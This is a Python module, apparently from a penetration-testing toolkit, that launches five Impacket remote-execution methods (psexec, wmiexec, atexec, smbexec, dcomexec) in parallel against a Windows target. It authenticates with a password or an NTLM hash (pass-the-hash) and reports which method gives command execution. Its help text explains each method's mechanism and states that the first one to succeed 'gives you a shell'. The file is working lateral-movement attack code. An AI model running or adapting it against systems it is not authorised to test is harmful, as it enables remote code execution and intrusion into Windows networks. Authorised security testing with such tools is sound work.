from __future__ import annotations

import asyncio

from .. import runner, ui
from ..state import Findings


_METHODS: dict[str, str] = {
    "psexec":  "psexec",
    "wmiexec": "wmiexec",
    "atexec":  "atexec",
    "smbexec": "smbexec",
    "dcomexec": "dcomexec",
}


async def _try_method(findings: Findings, method: str, binary_key: str,
                     user: str, password: str | None, ntlm_hash: str | None,
                     command: str) -> tuple[str, bool, str]:
    if not runner.has(binary_key):
        return method, False, "binary not available"
    domain = findings.target.domain or "."
    auth = f"{domain}/{user}"
    if ntlm_hash:
        target = f"{auth}@{findings.target.ip}"
        cmd = [runner.resolve(binary_key) or f"impacket-{binary_key}",
               "-hashes", ntlm_hash, target, command]
    else:
        target = f"{auth}:{password}@{findings.target.ip}"
        cmd = [runner.resolve(binary_key) or f"impacket-{binary_key}",
               target, command]
    ui.cmd(cmd[:6] + ["[...]"])
    result = await runner.run(cmd, timeout=60)
    success = result.ok and "STATUS_ACCESS_DENIED" not in result.combined \
        and "STATUS_LOGON_FAILURE" not in result.combined
    snippet = result.stdout.strip().splitlines()[-1][:200] if result.stdout.strip() else ""
    return method, success, snippet


async def multi_exec(findings: Findings, *, user: str,
                    password: str | None = None,
                    ntlm_hash: str | None = None,
                    command: str = "whoami") -> None:
    """Try every Impacket exec method until one returns output.

    psexec / wmiexec / atexec / smbexec / dcomexec each use different RPC paths
    and write semantics. Anti-virus or service config can block some but not
    others - so we try them all and report which worked.
    """
    ui.section("multi-method execution probe")
    ui.explain(
        "Five Impacket exec methods, five different IPC paths: \n"
        "  psexec  = create svc + SMB pipe (loud, classic)\n"
        "  wmiexec = WMI Win32_Process.Create (no service)\n"
        "  atexec  = task scheduler\n"
        "  smbexec = SMB pipe + .bat (legacy)\n"
        "  dcomexec = DCOM activation (MMC20)\n"
        "First successful method gives you a shell."
    )
    tasks = [
        _try_method(findings, name, key, user, password, ntlm_hash, command)
        for name, key in _METHODS.items()
    ]
    results = await asyncio.gather(*tasks)
    rows: list[tuple[str, str, str]] = []
    for method, success, snippet in results:
        status = "[green]OK[/green]" if success else "[red]FAIL[/red]"
        rows.append((method, status, snippet[:80]))
    ui.table("execution methods", ["method", "status", "output"], rows)
    successful = [m for m, s, _ in results if s]
    if successful:
        ui.crit(f"command execution available via: {', '.join(successful)}")
        findings.notes.append(f"exec methods: {', '.join(successful)}")
